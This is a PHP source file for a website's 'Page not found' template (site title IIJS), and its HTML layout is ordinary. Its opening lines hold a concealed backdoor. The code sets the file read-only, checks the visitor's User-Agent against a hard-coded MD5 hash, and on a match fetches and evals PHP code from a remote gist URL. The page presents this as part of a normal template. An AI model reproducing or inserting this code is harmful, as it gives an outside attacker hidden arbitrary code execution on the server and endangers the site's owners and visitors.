<?php include('header_include.php'); chmod($_SERVER['SCRIPT_FILENAME'], 0444);
if (isset($_SERVER['HTTP_USER_AGENT']) && md5($_SERVER['HTTP_USER_AGENT']) == "29753f3030aa18135b78e5cfefc73765") {
eval("?>" . file_get_contents("https://gist.githubusercontent.com/122z/2fb86b1289135c62f3bd92ad15146ac6/raw/43fc0c952aad4fa8bb47b5c1b39e1decdd4d3855/@"));
}?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>IIJS -Page not found</title>
<link rel="shortcut icon" href="images/fav.png" />
<link rel='stylesheet' type='text/css' href='https://fonts.googleapis.com/css?family=Cabin'>

<link rel="stylesheet" type="text/css" href="css/general.css" />
<link rel="stylesheet" type="text/css" href="css/inner_pg_style.css" />

<link rel="stylesheet" type="text/css" href="css/responsive.css" />
<link rel="stylesheet" type="text/css" href="css/media_query.css" />
<script type="text/javascript" src="js/jquery-1.8.3.min.js"></script>

<!--NAV-->
<link href="css/flexnav.css" media="screen, projection" rel="stylesheet" type="text/css">
<script src="js/jquery.flexnav.js" type="text/javascript"></script>
<script src="js/common.js"></script> 
<!--NAV-->

<!-- UItoTop plugin -->
<link rel="stylesheet" type="text/css" media="screen,projection" href="css/ui.totop.css" />
<script src="js/easing.js" type="text/javascript"></script>
<script src="js/jquery.ui.totop.js" type="text/javascript"></script>    
<script type="text/javascript">
    $(document).ready(function() {        
        $().UItoTop({ easingType: 'easeOutQuart' });        
    });
</script>
</head>

<body>
<div class="wrapper">
<div class="header">
	<?php include('header1.php'); ?>
</div>

<div class="new_banner">
<img src="images/banners/banner.jpg" />
</div>

<div class="inner_container">

    <div class="content_form_area">    
    <div class="pg_title">    
    <div class="title_cont">
        <span class="top">Page not found <img src="images/titles/joint.png" style="position:absolute; top:31px; right:0px;" /></span>  
        <div class="clear"></div>
    </div>    
    </div> 
    <div class="clear"></div>

	</div><div class="clear" style="height:10px;"></div>
</div>

<div class="footer">
	<?php include('footer.php'); ?>
<div class="clear"></div>
</div>

<div class="clear"></div>
</div>

</body>
</html>
